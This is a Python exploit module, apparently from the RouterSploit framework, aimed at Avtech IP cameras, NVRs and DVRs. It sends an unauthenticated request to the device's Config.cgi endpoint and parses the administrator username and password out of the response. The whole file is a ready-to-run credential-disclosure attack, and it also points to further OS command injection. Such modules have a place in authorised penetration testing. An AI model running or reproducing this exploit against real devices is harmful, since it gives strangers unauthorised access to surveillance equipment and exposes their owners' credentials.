import re
from routersploit import (
	exploits,
	print_error,
	print_info,
	print_success,
	print_table,
	http_request,
	mute,
	validators
)

class Exploit(exploits.Exploit):
	"""
	Exploit retrieves admin credentials from device on various AVTECH devices
	"""
	__info__ = {
		'name': 'Avtech IP Camera, NVR, and DVR credential disclosure',
		'description': 'Module exploits the /cgi-bin/nobody various Avtech devices which is permitted without authentication, to obtain credentials on the device',

		'authors': [
			'Austin <github.com/realoriginal>',
		],

		'references': [
			'https://www.exploit-db.com/exploits/40500/',
			'http://www.search-lab.hu/media/vulnerability_matrix.txt',
		],

		'devices': [
			'Any firmware version',
		],
	}

	target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
	port = exploits.Option(80, 'Target port')

	def __init__(self):
		self.content = None

	def run(self):
		if self.check():
			print_success("Target is vulnerable")
			print_info("These creds are the top ones, others may be available in browser view due to OS command injection attacks")
			headers = ("Username", "Password")
			print_table(headers, *self.content)
		else:
			print_error("Target is not vulnerable")


	@mute
	def check(self):
		url = "{}:{}/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*".format(self.target, self.port)
		response = http_request(method="GET", url=url)

		if 'Account' in response.text:
			self.content = response.text
			regular = "Account.User1.Username=(.+?)\nAccount.User1.Password=(|.+?)\n"
			creds = re.findall(regular, response.text)
			self.content = creds
			return True

		return False
